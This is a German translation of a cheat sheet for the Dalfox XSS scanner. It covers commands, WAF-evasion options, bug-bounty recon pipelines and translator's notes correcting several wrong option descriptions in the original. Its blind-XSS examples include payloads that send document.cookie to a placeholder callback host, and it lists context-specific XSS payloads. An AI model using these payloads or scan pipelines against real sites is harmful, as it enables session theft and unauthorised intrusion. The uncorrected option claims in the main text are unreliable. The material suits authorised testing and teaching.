# 🦊 Dalfox – Framework für XSS-Tests

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Leistungsfähiger XSS-Scanner und Analysewerkzeug
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Dalfox](#-was-ist-dalfox)
- [Installation](#-installation)
- [Grundlegende Verwendung](#-grundlegende-verwendung)
- [Scan-Modi](#-scan-modi)
- [Erweiterte Optionen](#-erweiterte-optionen)
- [Blind XSS](#-blind-xss)
- [Kurzreferenz](#-kurzreferenz)

---

## 🎯 Was ist Dalfox

**Dalfox** ist ein leistungsfähiger Scanner und ein Analysewerkzeug für XSS-Schwachstellen:

- 🔍 **Parameteranalyse** – Stellen finden, an denen Eingaben zurückgegeben werden
- 🎯 **XSS-Erkennung** – reflektierte und DOM-basierte Varianten
- 💉 **Blind XSS** – Prüfung über einen getrennten Kommunikationskanal
- ⚡ **Schnell** – laut Vorlage in Go geschrieben und stark parallelisiert

### Warum Dalfox?

| Eigenschaft | Nutzen |
|---------|---------|
| Intelligente Analyse | An den Kontext angepasste Payloads |
| WAF-Erkennung | Laut Vorlage gängige WAFs umgehen |
| Blind XSS | Unterstützung für Interaktionen über einen getrennten Kanal |
| Mining-Modus | Parameter aus JavaScript ermitteln |

---

## 🚀 Installation

```bash
# Mit Go installieren (laut Vorlage empfohlen)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Installation prüfen
dalfox version
```

---

## 📖 Grundlegende Verwendung

### Einzelne URL

```bash
# Einfacher Scan
dalfox url https://example.com/search?q=test

# Ausgabe speichern
dalfox url https://example.com/search?q=test -o results.txt
```

### Mehrere URLs

```bash
# Von der Standardeingabe
cat urls.txt | dalfox pipe

# Aus einer Datei
dalfox file urls.txt

# Mit Parallelität
cat urls.txt | dalfox pipe -w 50
```

### Stiller Modus

```bash
# Nur Schwachstellen anzeigen
dalfox url https://example.com/search?q=test --silence

# Keine Farbe
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Scan-Modi

### URL-Modus

```bash
# Einzelne URL prüfen
dalfox url https://example.com/page?param=value

# Mit Daten prüfen
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Pipe-Modus

```bash
# Von der Standardeingabe
echo "https://example.com/search?q=test" | dalfox pipe

# Mehrere URLs
cat urls_with_params.txt | dalfox pipe
```

### Dateimodus

```bash
# Aus einer Datei
dalfox file urls.txt

# Mit Ausgabedatei
dalfox file urls.txt -o results.txt
```

### Servermodus

```bash
# API-Server starten
dalfox server

# Eigener Port
dalfox server -p 8080

# Anschließend Anfragen senden:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a name="-erweiterte-optionen"></a>

## ⚙️ Erweiterte Optionen

### Eigene Header

```bash
# Header hinzufügen
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Mehrere Header
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookies und Authentifizierung

```bash
# Mit Cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Basic-Authentifizierung
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Eigene Payloads

```bash
# Eigene Payload-Datei verwenden
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Einzelne eigene Payload laut Vorlage
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Payload-Format in der Datei:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Ausgabeformate

```bash
# JSON-Ausgabe
dalfox url https://example.com/search?q=test --format json -o result.json

# Nur Schwachstellen laut Vorlage
dalfox url https://example.com/search?q=test --only-poc
```

### Leistung

```bash
# Worker festlegen (Parallelität)
dalfox url https://example.com/search?q=test -w 100

# Zeitlimit (Sekunden)
dalfox url https://example.com/search?q=test --timeout 10

# Verzögerung zwischen Anfragen (ms)
dalfox url https://example.com/search?q=test --delay 100
```

### WAF-Umgehung

```bash
# WAF-Umgehung verwenden
dalfox url https://example.com/search?q=test --waf-evasion

# Fingerprint laut Vorlage ignorieren
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# HTTP-Proxy
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Für Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 Blind XSS

### Blind-XSS-Payload verwenden

```bash
# Mit XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# Die Option -b fügt Blind-XSS-Callbacks hinzu
```

### Blind XSS mit eigener Payload

```bash
# Eigene Blind-XSS-Payload
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Beispiele für Blind-XSS-Payloads

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Kurzreferenz

### Grundlegende Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `dalfox url URL` | Einzelne URL prüfen |
| `dalfox file file.txt` | URLs aus einer Datei prüfen |
| `cat urls \| dalfox pipe` | URLs von der Standardeingabe prüfen |
| `dalfox server` | API-Server starten |

### Wichtige Optionen

| Option | Beschreibung |
|------|-------------|
| `-o file.txt` | Ausgabedatei |
| `-w 50` | Worker (Parallelität) |
| `-H "Header: value"` | Eigener Header |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Blind-XSS-Callback |
| `--proxy URL` | HTTP-Proxy |
| `--timeout 10` | Zeitlimit für Anfragen |

### Ausgabeoptionen

| Option | Beschreibung |
|------|-------------|
| `--format json` | JSON-Ausgabe |
| `--only-poc` | Nur PoC anzeigen |
| `--silence` | Stiller Modus |
| `--no-color` | Keine farbige Ausgabe |

### Payload-Optionen

| Option | Beschreibung |
|------|-------------|
| `-p "payload"` | Eigene Payload |
| `--custom-payload file` | Payload-Datei |
| `--waf-evasion` | WAF-Umgehungsmodus |

---

## 🎯 Bug-Bounty-Arbeitsabläufe

### Einfacher XSS-Scan

```bash
# Schneller Scan
dalfox url "https://target.com/search?q=test" --silence
```

### Aus einer URL-Sammlung

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Prüfung vieler URLs

```bash
# Alle Parameter aus den URLs prüfen
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Mit GF-Mustern

```bash
# Mit GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Mit httpx-Filter
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Scan mit Authentifizierung

```bash
# Mit Sitzung
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Umfassende Verarbeitungskette

```bash
# Vollständige Verarbeitungskette zur XSS-Suche
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Blind-XSS-Kampagne

```bash
# Blind XSS für viele URLs
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Gezielt für Eingabeformulare
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Hinweise zur XSS-Suche

1. **Alle Parameter prüfen** – nicht nur die offensichtlichen
2. **Verschiedene Kontexte prüfen** – HTML, JavaScript und Attribute
3. **Blind XSS verwenden** – etwa für Administrationsoberflächen und Protokolle
4. **Mit offenen Weiterleitungen verknüpfen** – laut Vorlage für größere Auswirkungen
5. **Antwortheader prüfen** – CSP und X-XSS-Protection
6. **POST-Parameter prüfen** – sie werden laut Vorlage häufig übersehen

### Häufige XSS-Einfügepositionen

```
- Suchfelder
- Profilfelder von Benutzern
- Kommentare und Rückmeldungen
- URL-Parameter
- HTTP-Header (Referer, User-Agent)
- Dateinamen bei Uploads
- Fehlermeldungen
```

### Kontextspezifische Payloads

| Kontext | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attribute | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Ressourcen

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [XSS-Payloads](https://github.com/payloadbox/xss-payload-list)

### Verwandte Spickzettel
- [Bug-Bounty-Methodik](../../Bug-Bounty-Methodology/translations/README.de.md)
- [XSS-Payloads](../../Payloads/XSS.md)
- [Burp Suite](../../Burp-Suite/translations/README.de.md)

---

<p align="center">
  <b>🦊 XSS-Schwachstellen finden!</b><br>
  <i>Dalfox – ein Werkzeug für die XSS-Suche</i>
</p>


---

## Hinweise zur deutschen Ausgabe

> **Versionen und Syntax:** Der Installationspfad und die Beispiele beziehen sich auf die Go-basierte v2. Die aktuelle Dokumentation beschreibt eine v3-Neuentwicklung und eine geänderte CLI; alte Unterbefehle werden teilweise als Kompatibilitätsaliase geführt. Optionsnamen und Serverfunktionen sind daher gegen die verwendete Version zu prüfen. Die Quelle zeigt außerdem nach einem Start mit Port 8080 eine kommentierte Anfrage an Port 8090; diese Angaben passen nicht zusammen. [Dalfox: Migration von v2](https://dalfox.hahwul.com/getting-started/migration/).

> **Konkrete Optionskorrekturen:** `-p` wählt Parameter und ist kein Schalter für eine einzelne eigene Payload. `--only-poc` erwartet in der geprüften v2 einen Typfilter und ist dort kein einfacher boolescher Schalter. `--skip-mining` beziehungsweise die versionsabhängigen Mining-Optionen betreffen das Ermitteln von Parametern, nicht allgemein Fingerprinting. `--basic-auth` steht nicht in der geprüften v2-Optionsliste. Die Originalzeilen und HTML-Payloads bleiben unverändert. [Dalfox v2.9.3: Optionsdefinitionen](https://github.com/hahwul/dalfox/blob/v2.9.3/cmd/root.go), [aktuelle Parameterdokumentation](https://dalfox.hahwul.com/guide/parameters/).

> **Auswertung und Voraussetzungen:** Eine Reflexion, ein PoC oder ein Callback ist anhand des konkreten Kontexts zu bewerten; solche Meldungen sind keine pauschale Garantie einer ausnutzbaren Schwachstelle. Die Cookie-Payload setzt unter anderem passende Browserrechte und Richtlinien voraus. WAF-Erkennung, Verzögerungen oder Mining-Schalter gewährleisten keine Umgehung. Dateinamen, Sessions und Callback-Adressen sind Musterwerte. Die Kombination von Werkzeugen setzt kompatible Ausgabe- und Eingabeformate voraus. Es wurde kein Scan, Callback oder Beispiel ausgeführt.
